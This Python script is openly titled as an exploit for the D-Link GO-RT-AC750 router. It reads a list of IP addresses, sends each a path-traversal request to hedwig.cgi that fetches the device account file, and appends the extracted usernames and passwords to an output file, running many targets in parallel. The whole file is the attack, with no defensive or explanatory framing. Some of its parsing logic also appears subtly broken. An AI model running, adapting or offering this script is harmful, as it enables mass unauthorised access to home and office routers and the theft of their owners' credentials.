import argparse
import logging
import requests
from xml.etree import ElementTree
import concurrent.futures

def run(host, port, output_file):
    try:
        url = f"http://{host}:{port}/hedwig.cgi" if port else f"http://{host}/hedwig.cgi"
        headers = {'Content-Type': 'text/xml', 'Cookie': 'uid=123'}
        data = '''<?xml version="1.0" encoding="utf-8"?><postxml>
        <module>
        <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
        </module>
        </postxml>'''
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200 and "<result>OK</result>" in response.text:
            logging.info("Command executed successfully on %s:%s", host, port)
            extract_credentials(response.text, host, port, output_file)
        else:
            logging.error("Error or unsuccessful response from %s:%s", host, port)
    except requests.exceptions.RequestException as e:
        logging.error("Request failed for %s:%s, Error: %s", host, port, e)

def extract_credentials(response_text, host, port, output_file):
    try:
        clean_xml = response_text.split("<?xml")[0]
        root = ElementTree.fromstring(clean_xml)
        username = root.find(".//name").text
        password = root.find(".//password").text

        if password != "==OoXxGgYy==":
            with open(output_file, "a") as file:
                file.write(f"Host: {host}:{port} - Username: {username}, Password: {password}\n")
            logging.info("Credentials extracted for %s:%s", host, port)
        else:
            logging.info("Invalid credentials (default password) for %s:%s", host, port)
    except Exception as e:
        logging.error("Failed to extract credentials: %s", e)


def worker(host_port, output_file):
    host, port = host_port if ':' in host_port else (host_port, '')
    run(host, port, output_file)

def main():
    parser = argparse.ArgumentParser(description='D-Link GO-RT-AC750 Exploit Script')
    parser.add_argument('--input_file', required=True, help="File containing IP[:Port] pairs")
    parser.add_argument('--output_file', required=True, help="Output file for credentials")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)

    with open(args.input_file, 'r') as file:
        host_ports = [line.strip() for line in file]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(worker, host_port, args.output_file) for host_port in host_ports]
        concurrent.futures.wait(futures)

if __name__ == '__main__':
    main()
